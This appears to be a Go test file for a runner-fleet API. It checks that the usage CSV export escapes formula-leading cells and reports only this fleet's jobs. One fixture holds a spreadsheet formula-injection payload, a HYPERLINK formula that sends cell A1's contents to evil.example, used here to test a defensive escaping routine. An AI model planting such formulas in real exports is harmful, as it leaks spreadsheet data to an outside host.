package api

import (
	"encoding/csv"
	"net/http"
	"strings"
	"testing"
	"time"

	"github.com/eyupio/zoomies/internal/store"
)

// A workflow can be called anything by anyone who can push to a repository the
// App can see, and its name lands in the first column of the export. Excel and
// Sheets evaluate a cell that begins with a formula character even when the CSV
// quoted it, so the operator who opens the export must get text, not a formula
// somebody else wrote.
func TestUsageCSVDefusesCellsThatWouldBeFormulas(t *testing.T) {
	h := newHarness(t)
	u, _ := h.user("viewer", store.RoleViewer)

	base := time.Date(2026, 3, 1, 12, 0, 0, 0, time.UTC)
	started, done := base.Add(time.Minute), base.Add(2*time.Minute)
	// Matched, because usage reports this fleet's jobs and a job no pool
	// claimed is somebody else's hosted runner. What is under test here is the
	// export's escaping, so the job has to be one that reaches the export.
	if _, err := h.st.UpsertJob(h.ctx, &store.Job{
		GitHubJobID: 4242, Repo: "acme/widgets", JobName: "build",
		Workflow: `=HYPERLINK("https://evil.example/?"&A1,"open")`,
		Matched:  true,
		State:    store.JobCompleted, QueuedAt: base, StartedAt: &started, CompletedAt: &done,
	}); err != nil {
		t.Fatalf("UpsertJob: %v", err)
	}

	resp := h.do(request{method: http.MethodGet, cookie: h.session(u),
		path: "/api/v1/usage.csv?group_by=workflow&from=" + base.Add(-time.Hour).Format(time.RFC3339) +
			"&to=" + base.Add(time.Hour).Format(time.RFC3339)})
	resp.mustStatus(t, http.StatusOK, "usage csv")

	records, err := csv.NewReader(strings.NewReader(string(resp.body))).ReadAll()
	if err != nil {
		t.Fatalf("the export is not valid CSV: %v", err)
	}
	if len(records) != 2 {
		t.Fatalf("got %d records, want a header and one row: %q", len(records), resp.body)
	}
	if got := records[1][0]; !strings.HasPrefix(got, "'=") {
		t.Errorf("group cell = %q; a leading formula character must be neutralised with an apostrophe", got)
	}
}

// TestUsageReportsOnlyThisFleetsJobs is the wiring from the route to the scope.
//
// The report exists to answer what this fleet consumed. A job GitHub ran on one
// of its own hosted runners used no runner here, waited in no queue of ours and
// cost this fleet nothing, so counting it inflates every column on the page.
func TestUsageReportsOnlyThisFleetsJobs(t *testing.T) {
	h := newHarness(t)
	u, _ := h.user("viewer", store.RoleViewer)

	base := time.Date(2026, 3, 1, 12, 0, 0, 0, time.UTC)
	started, done := base.Add(time.Minute), base.Add(2*time.Minute)
	for _, j := range []*store.Job{
		{GitHubJobID: 5001, Repo: "acme/ours", JobName: "build", Workflow: "ci", Matched: true,
			State: store.JobCompleted, QueuedAt: base, StartedAt: &started, CompletedAt: &done},
		// No pool claimed it and no runner here ran it: somebody else's.
		{GitHubJobID: 5002, Repo: "acme/theirs", JobName: "build", Workflow: "ci",
			State: store.JobCompleted, QueuedAt: base, StartedAt: &started, CompletedAt: &done},
	} {
		if _, err := h.st.UpsertJob(h.ctx, j); err != nil {
			t.Fatalf("seeding %s: %v", j.Repo, err)
		}
	}

	resp := h.do(request{method: http.MethodGet, cookie: h.session(u),
		path: "/api/v1/usage?group_by=repository&from=" + base.Add(-time.Hour).Format(time.RFC3339) +
			"&to=" + base.Add(time.Hour).Format(time.RFC3339)})
	resp.mustStatus(t, http.StatusOK, "usage by repository")

	body := string(resp.body)
	if !strings.Contains(body, "acme/ours") {
		t.Errorf("this fleet's own repository is missing from the report: %s", truncate(resp.body))
	}
	if strings.Contains(body, "acme/theirs") {
		t.Errorf("a repository whose jobs ran on hosted runners is in the report: %s", truncate(resp.body))
	}
}

func TestCSVTextLeavesOrdinaryNamesAlone(t *testing.T) {
	for _, s := range []string{"", "acme/widgets", "build and test", "zoomies-linux-x64", "ins_k3f9qz2m"} {
		if got := csvText(s); got != s {
			t.Errorf("csvText(%q) = %q, want it unchanged", s, got)
		}
	}
	for _, s := range []string{"=1+1", "+1", "-1", "@SUM(A1)", "\tx", "\rx"} {
		if got := csvText(s); got != "'"+s {
			t.Errorf("csvText(%q) = %q, want an apostrophe prefix", s, got)
		}
	}
}
